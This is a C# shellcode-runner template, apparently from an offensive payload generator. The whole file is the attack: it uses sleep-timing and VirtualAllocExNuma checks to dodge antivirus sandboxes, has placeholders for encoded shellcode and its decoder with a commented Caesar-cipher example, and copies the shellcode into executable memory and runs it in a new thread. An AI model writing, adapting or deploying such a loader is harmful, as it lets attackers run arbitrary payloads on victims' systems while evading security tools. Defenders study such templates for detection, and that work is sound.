using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{

	public class Class1 
	{ 
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
		
		[DllImport("kernel32.dll")] 
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
		
		[DllImport("kernel32.dll")] 
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);  

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
		
		public static void runner() 
		{ 
			//Heuristic scan bypass with sleep
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if(t2 < 1.5)
            {
                return;
            }
            
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if(mem == null)
            {
                return;
            }

            //main code
            %ENCSHELLCODE%
        
            //Decoding shellcode with Cesar Cipher
            //for(int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            //}

            %DECODER%            

			int size = buf.Length;
			IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
			Marshal.Copy(buf, 0, addr, size);
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); 
			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
	}
}